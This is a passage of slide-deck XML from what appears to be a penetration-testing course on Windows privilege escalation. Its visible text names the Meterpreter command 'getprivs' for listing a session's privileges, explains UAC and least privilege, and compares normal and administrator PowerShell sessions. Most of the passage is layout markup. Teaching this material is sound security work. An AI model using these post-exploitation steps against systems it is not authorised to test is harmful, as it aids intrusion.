                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Method 2:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>In Meterpreter, this is accomplished with</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:highlight>
                  <a:schemeClr val="dk2"/>
                </a:highlight>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:highlight>
                  <a:schemeClr val="dk2"/>
                </a:highlight>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="dk2"/>
                </a:highlight>
                <a:latin typeface="Inconsolata SemiBold"/>
                <a:ea typeface="Inconsolata SemiBold"/>
                <a:cs typeface="Inconsolata SemiBold"/>
                <a:sym typeface="Inconsolata SemiBold"/>
              </a:rPr>
              <a:t>getprivs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Roboto Medium"/>
              <a:ea typeface="Roboto Medium"/>
              <a:cs typeface="Roboto Medium"/>
              <a:sym typeface="Roboto Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="826" name="Google Shape;826;p99"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7202450" y="0"/>
            <a:ext cx="1953900" cy="5143500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2325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27" name="Google Shape;827;p99"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3822750" y="0"/>
            <a:ext cx="3655785" cy="5143499"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="828" name="Google Shape;828;p99"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="368445" y="2961700"/>
            <a:ext cx="2517900" cy="1656000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 9383" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="91425" lIns="18287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a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>This is important because it helps determine how privileged your user is and which privilege escalation technique should be used.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="829" name="Google Shape;829;p99"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="368445" y="2084249"/>
            <a:ext cx="877450" cy="8774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3" name="Shape 833"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="834" name="Google Shape;834;p100"/>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latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
              </a:rPr>
              <a:t>User Account Control and Tokens</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Roboto Medium"/>
              <a:ea typeface="Roboto Medium"/>
              <a:cs typeface="Roboto Medium"/>
              <a:sym typeface="Roboto Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="835" name="Google Shape;835;p100"/>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836" name="Google Shape;836;p100"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="70200" y="588350"/>
            <a:ext cx="8480400" cy="595200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="365750" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>In Windows, users have the ability to right-click a program and select </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>“Run as administrator” if they are logged in as an administrator. By default, </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>this is a feature of UAC.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="837" name="Google Shape;837;p100"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-12125" y="1624025"/>
            <a:ext cx="9168600" cy="3519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38" name="Google Shape;838;p100"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="5080" l="2497" r="3956" t="3878"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4584925" y="1927225"/>
            <a:ext cx="4054250" cy="2780050"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="839" name="Google Shape;839;p100"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="256378" y="2055300"/>
            <a:ext cx="3768600" cy="25239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600">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>UAC is a Windows security feature that applies the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>principle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> of least privilege, meaning the only time administrative access should be used is when it is needed. For example, checking the IP address can be accomplished by any user, but changing the IP address requires administrator privileges.</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="lt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101"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3264100" y="1348375"/>
            <a:ext cx="5137500" cy="24270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sz="3600">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Let’s compare a “normal” </a:t>
            </a:r>
            <a:endParaRPr sz="3600">
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="3600">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>PowerShell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="3600">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> session with a </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="3600">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>PowerShell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="3600">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> session run as an administrator.</a:t>
            </a:r>
            <a:endParaRPr sz="3600">
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="845" name="Google Shape;845;p101"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="649600" y="1521100"/>
            <a:ext cx="2081550" cy="20815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9" name="Shape 849"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="850" name="Google Shape;850;p102"/>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pic>
        <p:nvPicPr>
          <p:cNvPr id="851" name="Google Shape;851;p102"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="17985" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3908725" y="740400"/>
            <a:ext cx="5002299" cy="3388649"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="9525">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="sm" w="sm" type="none"/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="852" name="Google Shape;852;p102"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="552450"/>
            <a:ext cx="8667900" cy="18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53" name="Google Shape;853;p102"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="20609" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="276225" y="740400"/>
            <a:ext cx="3334202" cy="3388649"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="9525">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="sm" w="sm" type="none"/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="854" name="Google Shape;854;p102"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="209175" y="200025"/>
            <a:ext cx="34683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2"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent1"/>
                </a:highlight>
                <a:latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
              </a:rPr>
              <a:t>Run Via Double-Click (Normally)</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:highlight>
                <a:schemeClr val="accent1"/>
              </a:highlight>
              <a:latin typeface="Roboto Medium"/>
              <a:ea typeface="Roboto Medium"/>
              <a:cs typeface="Roboto Medium"/>
              <a:sym typeface="Roboto Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="855" name="Google Shape;855;p102"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3908725" y="200025"/>
            <a:ext cx="5002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2"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent1"/>
                </a:highlight>
                <a:latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
              </a:rPr>
              <a:t>Run as an Administrator</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:highlight>
                <a:schemeClr val="accent1"/>
              </a:highlight>
              <a:latin typeface="Roboto Medium"/>
              <a:ea typeface="Roboto Medium"/>
              <a:cs typeface="Roboto Medium"/>
              <a:sym typeface="Roboto Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="856" name="Google Shape;856;p102"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="321950" y="1297125"/>
            <a:ext cx="839400" cy="1560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102"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4000725" y="1267800"/>
            <a:ext cx="993300" cy="1560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102"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3894175" y="4283925"/>
            <a:ext cx="50022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dk2"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent1"/>
                </a:highlight>
                <a:latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
              </a:rPr>
              <a:t>Notice how many more permissions a process has now.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:highlight>
                <a:schemeClr val="accent1"/>
              </a:highlight>
              <a:latin typeface="Roboto Medium"/>
              <a:ea typeface="Roboto Medium"/>
              <a:cs typeface="Roboto Medium"/>
              <a:sym typeface="Roboto Medium"/>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62" name="Shape 862"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="863" name="Google Shape;863;p103"/>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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="864" name="Google Shape;864;p103"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="474795" y="1336048"/>
            <a:ext cx="2443353" cy="2443353"/>
            <a:chOff x="1190625" y="238125"/>
            <a:chExt cx="5238750" cy="5238750"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="865" name="Google Shape;865;p103"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1190625" y="238125"/>
              <a:ext cx="5238750" cy="5238750"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" h="209550" w="209550">
                  <a:moveTo>
                    <a:pt x="104775" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="99472" y="129"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="94039" y="517"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="88865" y="1164"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83691" y="2070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="78646" y="3234"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="73601" y="4657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="68815" y="6338"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64029" y="8279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="59373" y="10348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54845" y="12676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50447" y="15134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46179" y="17851"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="42169" y="20826"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38159" y="23930"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="34408" y="27164"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="30656" y="30656"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27293" y="34278"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23930" y="38159"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20826" y="42039"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17980" y="46179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15264" y="50447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12676" y="54845"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10348" y="59373"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8279" y="64029"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6338" y="68686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4786" y="73601"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3363" y="78517"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2199" y="83691"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1294" y="88865"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="517" y="94039"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="129" y="99342"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="104775"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="129" y="110208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="517" y="115511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1294" y="120685"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2199" y="125859"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3363" y="130904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4786" y="135949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6338" y="140735"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8279" y="145521"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10348" y="150178"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12676" y="154705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15264" y="159103"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17980" y="163371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20826" y="167511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23930" y="171391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27293" y="175272"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="30656" y="178894"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="34408" y="182257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38159" y="185620"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="42169" y="188724"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46179" y="191699"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50447" y="194416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54845" y="196874"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="59373" y="199202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64029" y="201271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="68815" y="203212"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="73601" y="204764"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="78646" y="206187"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83691" y="207351"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="88865" y="208386"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="94039" y="209033"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99472" y="209421"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="104775" y="209550"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="110208" y="209421"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="115511" y="209033"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="120815" y="208386"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="125859" y="207351"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="131033" y="206187"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="135949" y="204764"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="140864" y="203212"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="145650" y="201271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="150178" y="199202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="154705" y="196874"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="159103" y="194416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="163371" y="191699"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="167511" y="188724"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="171391" y="185620"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="175272" y="182257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="178894" y="178894"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="182386" y="175272"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="185620" y="171391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="188724" y="167511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="191699" y="163371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="194416" y="159103"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="196874" y="154705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="199202" y="150178"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="201401" y="145521"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="203212" y="140735"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="204893" y="135949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="206316" y="130904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="207480" y="125859"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="208386" y="120685"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="209033" y="115511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="209421" y="110208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="209550" y="104775"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="209421" y="99342"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="209033" y="94039"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="208386" y="88865"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="207480" y="83691"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="206316" y="78517"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="204893" y="73601"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="203212" y="68686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="201401" y="64029"/>
                  </a:lnTo>
                  <a:lnTo>
